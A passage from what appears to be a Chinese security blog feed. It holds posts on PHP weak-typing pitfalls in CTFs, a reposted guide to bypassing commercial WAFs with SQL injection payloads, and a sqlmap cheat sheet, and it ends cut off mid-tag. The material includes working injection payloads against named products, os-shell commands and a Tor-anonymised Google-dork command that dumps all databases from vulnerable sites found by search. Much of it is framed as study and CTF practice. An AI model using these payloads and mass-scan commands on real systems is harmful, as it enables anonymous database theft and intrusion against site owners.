title="参考链接"></a>参考链接</h1><p>Url编码规范：<a href="https://www.oschina.net/translate/what-every-web-developer-must-know-about-url-encoding" target="_blank" rel="noopener">https://www.oschina.net/translate/what-every-web-developer-must-know-about-url-encoding</a><br>几期『三个白帽』小竞赛的writeup：<a href="https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html</a><br>PHP代码审计分段讲解:<a href="https://github.com/bowu678/php_bugs" target="_blank" rel="noopener">https://github.com/bowu678/php_bugs</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>１．学习了怎么通过分析函数源代码了解函数缺陷<br>２．第一次分析条件矛盾的ctf，刚开始确实很晕但是理清楚函数之间的特异性。就能理清他为什么要设置这样的矛盾<br>３．学习了url编码</p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>| PHP弱类型 |</title>
    <link href="/2019/02/27/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    <url>/2019/02/27/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="Hash比较（科学计数法）"><a href="#Hash比较（科学计数法）" class="headerlink" title="Hash比较（科学计数法）"></a>Hash比较（科学计数法）</h1><pre><code class="hljs 1c"><span class="hljs-string">"0e132456789"</span>==<span class="hljs-string">"0e7124511451155"</span> <span class="hljs-comment">//true</span><span class="hljs-string">"0e123456abc"</span>==<span class="hljs-string">"0e1dddada"</span><span class="hljs-comment">//false</span><span class="hljs-string">"0e1abc"</span>==<span class="hljs-string">"0"</span>     <span class="hljs-comment">//true</span></code></pre><h1 id="十六进制转换"><a href="#十六进制转换" class="headerlink" title="十六进制转换"></a>十六进制转换</h1><pre><code class="hljs 1c"><span class="hljs-string">"0x1e240"</span>==<span class="hljs-string">"123456"</span> <span class="hljs-comment">//true</span><span class="hljs-string">"0x1e240"</span>==<span class="hljs-number">123456</span> <span class="hljs-comment">//true</span><span class="hljs-string">"0x1e240"</span>==<span class="hljs-string">"1e240"</span> <span class="hljs-comment">//false</span></code></pre><p>字符串解析为十进制在进行比较</p><h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><p>Int转string</p><pre><code class="hljs autoit">$var = <span class="hljs-number">5</span><span class="hljs-comment">;</span>方式<span class="hljs-number">1</span>：$item = (<span class="hljs-built_in">string</span>)$var<span class="hljs-comment">;</span>方式<span class="hljs-number">2</span>：$item = strval($var)<span class="hljs-comment">;</span></code></pre><h1 id="String转int-intval-函数"><a href="#String转int-intval-函数" class="headerlink" title="String转int : intval()函数"></a>String转int : intval()函数</h1><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">var_dump</span><span class="hljs-params">(intval(<span class="hljs-string">'2'</span>)</span></span>) <span class="hljs-comment">//2</span><span class="hljs-function"><span class="hljs-title">var_dump</span><span class="hljs-params">(intval(<span class="hljs-string">'3abcd'</span>)</span></span>) <span class="hljs-comment">//3</span><span class="hljs-function"><span class="hljs-title">var_dump</span><span class="hljs-params">(intval(<span class="hljs-string">'abcd'</span>)</span></span>) <span class="hljs-comment">//0</span></code></pre><h2 id="Ctf-demo"><a href="#Ctf-demo" class="headerlink" title="Ctf demo"></a>Ctf demo</h2><p>if(intval($a)&gt;1000) {<br>    mysql_query(“select * from news where id=”.$a)<br>}</p><p>$a=1002 union…　造成ｓｑｌ注入</p><h1 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h1><p>intval()转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。<br>即使出现无法转换的字符串，intval()不会报错而是返回0。<br>注：<br>在科学计数法字符串转换为数字时，如果 E 后面的数小于某个值会弄成 double 类型，再强制转换为 int 类型时可能会有奇妙的结果，测试发现某变量为 1e-1000 时已经可以触发这个漏洞绕过两个检查，使得某变量既大于 0 又不大于 0。<br>例如：</p><pre><code class="hljs lisp">var_dump((<span class="hljs-name">int</span>)('<span class="hljs-number">1e-1000</span>')&gt;0)<span class="hljs-comment">;</span>var_dump('<span class="hljs-number">1e-1000</span>'&gt;0)<span class="hljs-comment">;</span></code></pre><p>结果</p><pre><code class="hljs gauss">Command <span class="hljs-keyword">line</span> <span class="hljs-built_in">code</span>:<span class="hljs-number">1</span>:<span class="hljs-keyword">bool</span>(true)Command <span class="hljs-keyword">line</span> <span class="hljs-built_in">code</span>:<span class="hljs-number">1</span>:<span class="hljs-keyword">bool</span>(false)</code></pre><p>再如：</p><pre><code class="hljs lisp">var_dump((<span class="hljs-name">int</span>)('<span class="hljs-number">1e-10</span>')&gt;0)<span class="hljs-comment">;</span>var_dump('<span class="hljs-number">1e-10</span>'&gt;0)<span class="hljs-comment">;</span></code></pre><p>结果</p><pre><code class="hljs gauss">Command <span class="hljs-keyword">line</span> <span class="hljs-built_in">code</span>:<span class="hljs-number">1</span>:<span class="hljs-keyword">bool</span>(true)Command <span class="hljs-keyword">line</span> <span class="hljs-built_in">code</span>:<span class="hljs-number">1</span>:<span class="hljs-keyword">bool</span>(true)</code></pre><h1 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h1><p>字符串对比解析，ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。<br>注：这里的%00是需要urldecode才可以截断的，这是url终止符，且%00长度是1不是3</p><h1 id="内置函数的参数的松散性"><a href="#内置函数的参数的松散性" class="headerlink" title="内置函数的参数的松散性"></a>内置函数的参数的松散性</h1><p>内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。</p><h2 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h2><pre><code class="hljs php">$array1[] = <span class="hljs-keyword">array</span>(<span class="hljs-string">"foo"</span> =&gt; <span class="hljs-string">"bar"</span>,<span class="hljs-string">"bar"</span> =&gt; <span class="hljs-string">"foo"</span>,);$array2 = １;var_dump(md5($array1)==var_dump($array2)); <span class="hljs-comment">//true</span></code></pre><p><img src="./1/png" srcset="/img/loading.gif" alt=""></p><h2 id="Strcmp"><a href="#Strcmp" class="headerlink" title="Strcmp()"></a>Strcmp()</h2><pre><code class="hljs mel"><span class="hljs-keyword">strcmp</span> ( <span class="hljs-keyword">string</span> $str1 , <span class="hljs-keyword">string</span> $str2 ) : <span class="hljs-keyword">int</span>$array=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];var_dump(<span class="hljs-keyword">strcmp</span>($array,<span class="hljs-string">'123'</span>)); <span class="hljs-comment">//null,在某种意义上null也就是相当于false。</span></code></pre><p><img src="./2/png" srcset="/img/loading.gif" alt=""></p><h2 id="switch"><a href="#switch" class="headerlink" title="switch()"></a>switch()</h2><p>如果case判断值为int形，switch会将传入的参数转换为int类型</p><pre><code class="hljs php">$i =<span class="hljs-string">"2abc"</span>;<span class="hljs-keyword">switch</span> ($i) &#123;<span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:    <span class="hljs-keyword">echo</span> <span class="hljs-string">"i is less than 3 but not negative"</span>;    <span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:    <span class="hljs-keyword">echo</span> <span class="hljs-string">"i is 3"</span>;&#125;</code></pre><p><img src="./3/png" srcset="/img/loading.gif" alt=""></p><h1 id="“-”和’-’弱类型问题"><a href="#“-”和’-’弱类型问题" class="headerlink" title="“==”和’===’弱类型问题"></a>“==”和’===’弱类型问题</h1><p><code>＝＝</code>：比较两侧的值，不同类型会自动转换为同种类型。如传参与整形比较－&gt;整形。传参与字符串比较－&gt;字符串</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$a = $_GET[<span class="hljs-string">'a'</span>];</span><span class="php"><span class="hljs-keyword">if</span> ($a==<span class="hljs-number">1</span>)</span><span class="php">&#123;</span><span class="php"><span class="hljs-keyword">echo</span> ‘vul-&gt;’.$a;</span><span class="php">&#125;</span></code></pre><p>Payload : <code>http://127.0.0.1/fuzz.php?a=1a</code><br>成功进入ｉｆ条件语句中<br><img src="./4/png" srcset="/img/loading.gif" alt=""><br><code>“＝＝＝”</code>：　符号比较两侧的值和类型，但不是绝对安全的。在加减乘除中会自动进行整形转换。<br>ＤＥＭＯ:</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$a = $_GET[<span class="hljs-string">'a'</span>];</span><span class="php">$b = $_GET[<span class="hljs-string">'b'</span>];</span><span class="php"><span class="hljs-keyword">if</span>($a+$b===<span class="hljs-number">2</span>)</span><span class="php">&#123;</span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">'vul-&gt;'</span>.$a.<span class="hljs-string">'&lt;/br&gt;'</span>.$b;</span><span class="php">&#125;</span></code></pre><p>Payload : <code>&quot;http://172.31.19.5/fuzz.php?a=1a&amp;b=1b&quot;</code><br>成功进入条件语句<br><img src="./5/png" srcset="/img/loading.gif" alt=""></p><h2 id="修复策略"><a href="#修复策略" class="headerlink" title="修复策略"></a>修复策略</h2><p>：intval强制类型转换或者过滤</p><h1 id="In-array-函数使用不严谨导致的弱类型"><a href="#In-array-函数使用不严谨导致的弱类型" class="headerlink" title="In_array()函数使用不严谨导致的弱类型"></a>In_array()函数使用不严谨导致的弱类型</h1><pre><code class="hljs angelscript"><span class="hljs-keyword">if</span>(in_array($_GET[<span class="hljs-string">'id'</span>],<span class="hljs-built_in">array</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>)))&#123;echo $_GET[<span class="hljs-string">'id'</span>];&#125;</code></pre><p>Payload:<code>&quot;http://172.31.19.5/fuzz.php?id=1a&quot;</code><br>成功转换<br><img src="./6/png" srcset="/img/loading.gif" alt=""></p><h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><p>开启函数中的参数strict=Ture ,传参使用intval修饰<br><code>if(in_array(intval($_GET[&#39;id&#39;]),array(1,2,3,4,5),true))</code></p><h1 id="is-numeric-十六进制转换字符"><a href="#is-numeric-十六进制转换字符" class="headerlink" title="is_numeric()十六进制转换字符"></a>is_numeric()十六进制转换字符</h1><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span> </span><span class="php"><span class="hljs-keyword">if</span>(is_numeric($_GET[<span class="hljs-string">'num'</span>]))</span><span class="php">&#123;</span><span class="php"><span class="hljs-comment">//echo $_GET['num'];</span></span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;/br&gt;'</span>;</span><span class="php"><span class="hljs-comment">//假设这个插入进了mysql数据库，mysql数据库就会把十六进制转换成了字符串，这里为了方便用 Hex2String 函数代替</span></span><span class="php"><span class="hljs-keyword">echo</span> Hex2String($_GET[<span class="hljs-string">'num'</span>]);</span><span class="php">&#125;</span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Hex2String</span><span class="hljs-params">($hex)</span></span>&#123;</span><span class="php">$string=”;</span><span class="php"><span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; strlen($hex)<span class="hljs-number">-1</span>; $i+=<span class="hljs-number">2</span>)&#123;</span><span class="php">$string .= chr(hexdec($hex[$i].$hex[$i+<span class="hljs-number">1</span>]));</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">return</span> $string;</span><span class="php">&#125;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><p>//输入<code>http://127.0.01/equal.php?num=0x39393939393939393939393920756e696f6e20616c6c202873656c656374202748656c6c6f21212729</code><br>//输出<code>0x39393939393939393939393920756e696f6e20616c6c202873656c656374202748656c6c6f2121272</code><br>//输出<code>9999999999999 union all (select ‘Hello!!’)</code></p><p>参考链接;<a href="https://blog.spoock.com/2016/06/25/weakly-typed-security/" target="_blank" rel="noopener">https://blog.spoock.com/2016/06/25/weakly-typed-security/</a><br>        <a href="https://skysec.top/2017/07/22/PHP%E5%87%BD%E6%95%B0%E9%BB%91%E9%AD%94%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://skysec.top/2017/07/22/PHP%E5%87%BD%E6%95%B0%E9%BB%91%E9%AD%94%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>转载 | WAF攻防之SQL注入篇</title>
    <link href="/2019/02/26/%E8%BD%AC%E8%BD%BD-WAF%E6%94%BB%E9%98%B2%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
    <url>/2019/02/26/%E8%BD%AC%E8%BD%BD-WAF%E6%94%BB%E9%98%B2%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="0×00-前言"><a href="#0×00-前言" class="headerlink" title="0×00 前言"></a>0×00 前言</h1><blockquote><blockquote><blockquote></blockquote><p>随着国家安全法的出台，网络安全迎来发展的新时期，越来越多企业或政府单位开始重视网络安全。很多网站陆陆续续告别裸奔时代，开始部署web应用防火墙（WAF）以应对网络攻击。由此，相关网站的安全性很大程度上取决于WAF的防护能力，WAF攻防研究已成为安全从业人员的必修课之一。</p></blockquote></blockquote><blockquote><blockquote><blockquote></blockquote><p>大多数WAF以规则匹配为基础进行安全防护，少数WAF带有自学习能力，规则维护成为WAF的核心。近年来，基于语义识别的WAF陆续出现，对其防护能力的研究也成为大家关心的热点之一。本文以MySQL为研究对象，总结相关WAF注入绕过技术，通过实战演练让大家了解各大WAF的相关特性，最后从攻防角度对WAF安全进行总结。</p></blockquote></blockquote><h1 id="0×01-注入绕过技术总结"><a href="#0×01-注入绕过技术总结" class="headerlink" title="0×01 注入绕过技术总结"></a>0×01 注入绕过技术总结</h1><p>对已知的WAF相关绕过技术，总结如下，网上已有相关技巧的讲解，这里就不一一演示，不明白的可以自己查询相关资料：<br><img src="./1.png" srcset="/img/loading.gif" alt=""><br>在实际攻击场景中，单一的绕过技巧往往无效，需要我们综合利用各种绕过技术进行组合，结合各自WAF特性不断进行推理，才能真正实现绕过。</p><h1 id="0×02-注入点检测绕过"><a href="#0×02-注入点检测绕过" class="headerlink" title="0×02 注入点检测绕过"></a>0×02 注入点检测绕过</h1><p>Bypass WAF的第一步是识别注入点，我们拿到一个URL，第一步判断参数是否有注入，然后再进行后续的绕过。简单的and 1=1 and 1=2判断肯定会被WAF拦截，我们需转变思路进行绕过，一般WAF为了平衡风险和业务的关系不会对下面数字型探测方式进行拦截，否则会产生大量误报影响正常业务运行。<br><img src="./2.png" srcset="/img/loading.gif" alt=""><br><img src="./3.png" srcset="/img/loading.gif" alt=""><br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h2 id="本地测试环境："><a href="#本地测试环境：" class="headerlink" title="本地测试环境："></a>本地测试环境：</h2><p><img src="./5.png" srcset="/img/loading.gif" alt=""><br>如若 and也会拦截，可以直接在参数上进行类似判断操作，如<code>id=1*0</code> 、<code>id=1*2</code>，除了以上方法，还有很多其它衍生出的识别绕过方法，以<code>{“op}</code>为例作演示，其它的方法大家可以按照这种思路自行发挥：</p><h3 id="安全狗："><a href="#安全狗：" class="headerlink" title="安全狗："></a>安全狗：</h3><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h3 id="百度云加速："><a href="#百度云加速：" class="headerlink" title="百度云加速："></a>百度云加速：</h3><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h3 id="腾讯云："><a href="#腾讯云：" class="headerlink" title="腾讯云："></a>腾讯云：</h3><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h3 id="阿里云："><a href="#阿里云：" class="headerlink" title="阿里云："></a>阿里云：</h3><p><img src="./9.png" srcset="/img/loading.gif" alt=""><br>当我们已确认注入点后，下一步的目标是完全<code>Bypass WAF</code>出任意数据，以下以安全狗、modsecurity、百度云加速、 阿里云盾、长亭雷池截止目前最新的版本为例，这里只提供绕过的思路，即如何利用已知技巧进行组合推理来绕过相关WAF防护，出数据具体过程这里就不详解，大家感兴趣的可以手动尝试。</p><h1 id="0×03-安全狗Bypass"><a href="#0×03-安全狗Bypass" class="headerlink" title="0×03 安全狗Bypass"></a>0×03 安全狗Bypass</h1><p>本地无WAF测试环境：<br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><p>在对安全狗的绕过测试中发现，只需利用一个<em>/闭合多个/</em>!即可绕过，简单粗暴。<br><code>http://192.168.20.123:81/user.php?id=-11/*!union/*!select/*!1,(select/*!password/*!from/*!test.user limit 0,1),3*/</code><br><img src="./11.png" srcset="/img/loading.gif" alt=""></p><h1 id="0×04-Modsecurity-Bypass"><a href="#0×04-Modsecurity-Bypass" class="headerlink" title="0×04 Modsecurity Bypass"></a>0×04 Modsecurity Bypass</h1><p>本地环境搭建modsecurity模块进行安全防护，利用<code>{“op}、/*!50000*/</code>组合进行绕过。<br><code>http://192.168.20.123/user.php?id=1and{</code>version<code>length((select/*!50000schema_name*/from/*!50000information_schema.schemata*/limit 0,1))&gt;0}</code><br><img src="./12.png" srcset="/img/loading.gif" alt=""></p><h1 id="0×05-百度云加速Bypass"><a href="#0×05-百度云加速Bypass" class="headerlink" title="0×05 百度云加速Bypass"></a>0×05 百度云加速Bypass</h1><p>利用<code>–+%0a</code>进行绕过。<br><img src="./13.png" srcset="/img/loading.gif" alt=""><br><img src="./20.png" srcset="/img/loading.gif" alt=""></p><h1 id="0×06-阿里云盾Bypass"><a href="#0×06-阿里云盾Bypass" class="headerlink" title="0×06 阿里云盾Bypass"></a>0×06 阿里云盾Bypass</h1><p>利用<code>–+%0a、@自定义变量、{a key}</code>组合进行绕过。<br><img src="./14.png" srcset="/img/loading.gif" alt=""><br><img src="./15.png" srcset="/img/loading.gif" alt=""></p><h1 id="0×07-长亭雷池Bypass"><a href="#0×07-长亭雷池Bypass" class="headerlink" title="0×07 长亭雷池Bypass"></a>0×07 长亭雷池Bypass</h1><p>经过大量测试后，发现雷池在处理MySQL注释符<code>/*! */</code>识别时存在缺陷，只需把攻击语句放在注释符中即可绕过。<br><img src="./16.png" srcset="/img/loading.gif" alt=""><br><img src="./17.png" srcset="/img/loading.gif" alt=""></p><h1 id="0×08-自动化bypass"><a href="#0×08-自动化bypass" class="headerlink" title="0×08 自动化bypass"></a>0×08 自动化bypass</h1><p>当我们挖掘出绕过相关WAF进行SQL注入的技巧后，下一步就是编写脚本实现工具自动化注入。以sqlmap为例，我们编写tamper脚本实现注入自动化。<br><img src="./18.png" srcset="/img/loading.gif" alt=""><br><img src="./19.png" srcset="/img/loading.gif" alt=""><br>#　0×09 WAF防御</p><blockquote><blockquote><blockquote></blockquote><p>对已知或未知的安全问题进行防御是WAF功能的核心，漏报及误报是衡量一个WAF产品好坏的重要指标，具体落实到规则的及时更新、bypass新技巧的及时响应。另外，还应综合利用拦截日志数据进行相关算法分析，不断提高WAF的防护能力。总结来说，打造一款上乘的WAF，非一朝一日之功，需长期的技术储备、产品不断地更新迭代、算法地持续优化，才能把好防御这个重要的关口。同时，不断探索新的高效防护方法，才能在攻防战中立于不败之地。</p></blockquote></blockquote><p>#　0xa0 总结</p><blockquote><blockquote><blockquote></blockquote><p>从攻击者角度来看，绕过WAF的基本方法其实不多，如何把这些已知方法融合起来，并结合各自WAF本身的防护特性，不断进行推理，成为突破WAF防护的关键。当然，自动化Fuzz才是WAF Bypass新技术产生的正道。另外，从个人的注入Bypass测试过程看，绕过基于语义识别的WAF比绕过基于规则识别的WAF难得多，值得我们挑战。<br>从WAF产品角度来看，衡量一个WAF好坏的标准是漏报率和误报率的高低，但这些指标建立在以WAF不影响正常业务为前提。测试中我发现，基于规则的WAF对业务的耦合度往往较低，不管是腾讯云WAF还是阿里云盾，对用户的输入都较为敏感，如参数中输入注释符请求就会被拦截。而基于语义的WAF的和业务的耦合度较高，误报率下降明显。从测试结果来看，基于语义识别的WAF相较传统WAF来说有较大优势，值得我们学习和借鉴。<br>从安全管理者角度来讲，从以上测试过程可以看出，不管是基于规则的WAF还是基于语义识别的WAF，都存在被都完全绕过的可能。WAF的主要作用是提高攻击门槛，但不能消灭攻击入侵事件，解决安全问题的根本途径还得从代码层面着手进行修复。 </p></blockquote></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap操作详解(常用备忘录)</title>
    <link href="/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/"/>
    <url>/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前整理了些，在一些ＣＴＦ中发现随着编码、消毒、注入类型的改变有点不够用了。遂又熬了通宵整理了ｓｑｌｍａｐ使用和ｓｑｌ过waf技巧。后续持续更新</p><h1 id="常规盲注爆库爆表爆列爆字段（适用较多数据库类型）"><a href="#常规盲注爆库爆表爆列爆字段（适用较多数据库类型）" class="headerlink" title="常规盲注爆库爆表爆列爆字段（适用较多数据库类型）"></a>常规盲注爆库爆表爆列爆字段（适用较多数据库类型）</h1><h2 id="判断能否注入"><a href="#判断能否注入" class="headerlink" title="判断能否注入"></a>判断能否注入</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot;</code><br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h2 id="猜解表"><a href="#猜解表" class="headerlink" title="猜解表"></a>猜解表</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --tables</code><br>》》指定数据库表名<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --tables -D security</code><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h2 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --columns -T users</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><h2 id="猜解字段"><a href="#猜解字段" class="headerlink" title="猜解字段"></a>猜解字段</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --dump -T users -C &quot;username,password,id&quot;</code><br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h1 id="利用cookies"><a href="#利用cookies" class="headerlink" title="利用cookies"></a>利用cookies</h1><p><img src="./5.png" srcset="/img/loading.gif" alt=""><br><code>--level</code> 2 枚举强度<br><code>--cookie</code> “uname=admin” 可注入点<br>在<code>sqlilabs Less20</code>下实验</p><h2 id="尝试是否存在注入"><a href="#尝试是否存在注入" class="headerlink" title="尝试是否存在注入"></a>尝试是否存在注入</h2><p><code>sqlmap &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --cookie &quot;uname=admin*&quot; --level 2</code><br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h2 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --cookie &quot;uname=admin*&quot; --tables --level 2</code><br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h1 id="SQLmap用于mysql注入"><a href="#SQLmap用于mysql注入" class="headerlink" title="SQLmap用于mysql注入"></a>SQLmap用于mysql注入</h1><p>(1)查找数据库<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --dbs</code><br><img src="./8.png" srcset="/img/loading.gif" alt=""><br>(2)通过第一步的数据库查找表<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --D security --tables</code><br>(3)通过表名查列名<br> <code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; -D security -T users --columns</code><br>(4) 通过列查字段<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; -D security -T users -C “id,user,password” --dump</code></p><h1 id="sqlmap中post登陆框注入"><a href="#sqlmap中post登陆框注入" class="headerlink" title="sqlmap中post登陆框注入"></a>sqlmap中post登陆框注入</h1><p>(1) sqlmap -u “<a href="http://192.168.43.195/sqlilabs/Less-17&quot;" target="_blank" rel="noopener">http://192.168.43.195/sqlilabs/Less-17&quot;</a> –data “uname=1&amp;passwd=1”<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><h1 id="交互式-shell"><a href="#交互式-shell" class="headerlink" title="交互式 shell"></a>交互式 shell</h1><p>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-cmd “ipconfig”<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-shell<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-pwn<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –sql-shell<br><strong>条件绝对路径+注入点</strong><br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><h1 id="伪静态网页注入"><a href="#伪静态网页注入" class="headerlink" title="伪静态网页注入"></a>伪静态网页注入</h1><p>显示为HTML网页，其实有和数据库交互<br>sqlmap -u “<a href="http://www.123.com/index/id/2*.com&quot;" target="_blank" rel="noopener">http://www.123.com/index/id/2*.com&quot;</a></p><h1 id="sqlmap绕过WAF防火墙"><a href="#sqlmap绕过WAF防火墙" class="headerlink" title="sqlmap绕过WAF防火墙"></a>sqlmap绕过WAF防火墙</h1><p>sqlmap tamper下有绕过文件选项<br>–batch Never ask for user input, use the default behaviour<br>–tamper=TAMPER Use given script(s) for tampering injection data<br>常见 encoder: space2hash.py, space2morehash.py, base64encode.py, charencode.py<br>示例<br><code>./sqlmap.py -u &quot;http://www.xxx.com&quot; -v 3 --dbs --batch --tamper &quot;space2hash.py&quot;</code></p><h1 id="Tor代理与跳板"><a href="#Tor代理与跳板" class="headerlink" title="Tor代理与跳板"></a>Tor代理与跳板</h1><p><code>sudo service tor start</code><br>下面的命令将运行 SQLMap 用一些基本的设置使用 Tor 继续攻击者匿名, 也完全自动化的选择可能脆弱的网站, 使其在谷歌上搜索他们。<br>从一个终端攻击者将执行下列 (记住, 这只是向您显示攻击者是多<br>么容易, 您可能不希望运行此):<br><code>./sqlmap.py --tor --tor-type=SOCKS5 -g &quot;inurl:.php?id=1&quot; --random-agent --dump-all --batch--time-sec=15</code></p><h1 id="使用-Tor-网络当连接到目标网站攻击"><a href="#使用-Tor-网络当连接到目标网站攻击" class="headerlink" title="使用 Tor 网络当连接到目标网站攻击"></a>使用 Tor 网络当连接到目标网站攻击</h1><p><code>--tor-type=SOCKS5</code><br>在 <code>SOCKS5</code> 协议使用 <code>Tor</code>，比默认 <code>Tor</code> 匿名类型 <code>HTTP</code> 代理更好用。<br>使用代理访问外网网址<br><code>--proxy=(http|socks5|https)://127.0.0.1:PORT</code></p><h1 id="任意注射点"><a href="#任意注射点" class="headerlink" title="任意注射点"></a>任意注射点</h1><p>添加*<br><code>$ python sqlmap.py -u &quot;http://targeturl&quot; --cookie=&quot;param1=value1*;param2=value2&quot;</code></p><h1 id="定制注射负载"><a href="#定制注射负载" class="headerlink" title="定制注射负载"></a>定制注射负载</h1><p>选项：<code>--prefix</code>和<code>--suffix</code></p><pre><code class="hljs vim">$ <span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-comment">"http://192.168.136.131/sqlmap/mysql/get_str_brackets.php\</span>?id=<span class="hljs-number">1</span><span class="hljs-string">" -p id --prefix "</span><span class="hljs-string">')" --suffix "AND ('</span><span class="hljs-keyword">abc</span><span class="hljs-string">'='</span><span class="hljs-keyword">abc</span><span class="hljs-comment">"</span>[...]</code></pre><p>sqlmap形成payload如下：<br><code>$query = &quot;SELECT * FROM users WHERE id=(&#39;1&#39;) &lt;PAYLOAD&gt; AND (&#39;abc&#39;=&#39;abc&#39;) LIMIT 0, 1&quot;;</code></p><h1 id="水平选择"><a href="#水平选择" class="headerlink" title="水平选择"></a>水平选择</h1><p>–level<br>sqlmap使用的有效负载在文本文件中指定xml/payloads.xml<br>始终测试GET和POST参数，从级别2测试HTTP Cookie标头值，并测试HTTP User-Agent / Referer标头的值3级</p><h1 id="页面比较"><a href="#页面比较" class="headerlink" title="页面比较"></a>页面比较</h1><p>选项：–string，–not-string，–regexp和–code<br>//true和false值的选择根据需要来定<br>‘False 401 True 200’ -&gt;true –code=200<br>‘False Forbidden True Welcome’ -&gt; –titles=Welcome</p><h1 id="sql注入技术选择"><a href="#sql注入技术选择" class="headerlink" title="sql注入技术选择"></a>sql注入技术选择</h1><pre><code class="hljs armasm"><span class="hljs-keyword">B：基于布尔的盲</span><span class="hljs-keyword">E：基于错误</span><span class="hljs-keyword">U：基于联合查询</span><span class="hljs-keyword">S：堆叠查询</span><span class="hljs-keyword">T：基于时间的盲人</span><span class="hljs-keyword">Q：内联查询</span></code></pre><p>例如，ES如果您只想测试和利用基于错误的堆栈查询SQL注入类型，则可以提供。默认值为BEUSTQ</p><h1 id="union查询中的sql注入条件修改"><a href="#union查询中的sql注入条件修改" 